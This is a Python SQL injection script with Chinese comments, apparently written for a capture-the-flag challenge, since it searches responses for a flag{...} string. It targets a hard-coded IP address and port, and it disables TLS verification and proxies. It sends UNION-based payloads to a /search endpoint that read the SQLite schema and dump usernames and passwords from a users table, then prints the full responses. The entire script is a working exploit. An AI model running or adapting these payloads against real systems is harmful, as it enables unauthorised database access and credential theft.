import requests
import re
import os

os.environ.pop('HTTP_PROXY', None)
os.environ.pop('HTTPS_PROXY', None)
requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
session = requests.Session()
session.verify = False
session.proxies = {}
session.headers.update({"User-Agent": "Mozilla/5.0"})

print("="*70)
print("获取SQL注入完整响应")
print("="*70)

# 测试几个关键的SQL注入payload
sql_payloads = [
    "' UNION SELECT sqlite_version(),2,3--",
    "' UNION SELECT name,2,3 FROM sqlite_master WHERE type='table'--",
    "' UNION SELECT sql,2,3 FROM sqlite_master--",
    "' UNION SELECT *,2,3 FROM users--",
    "' UNION SELECT username,password,3 FROM users--",
    "' UNION SELECT group_concat(username || ':' || password),2,3 FROM users--",
]

for payload in sql_payloads:
    print(f"\n{'='*70}")
    print(f"SQL Payload: {payload}")
    print(f"{'='*70}")
    
    r = session.get(f"{TARGET}/search", params={"q": payload}, timeout=15)
    
    print(f"状态码: {r.status_code}")
    print(f"完整响应:\n{r.text}")
    
    # 搜索flag
    flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
    if flag_match:
        print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
        exit(0)

print("\n测试完成")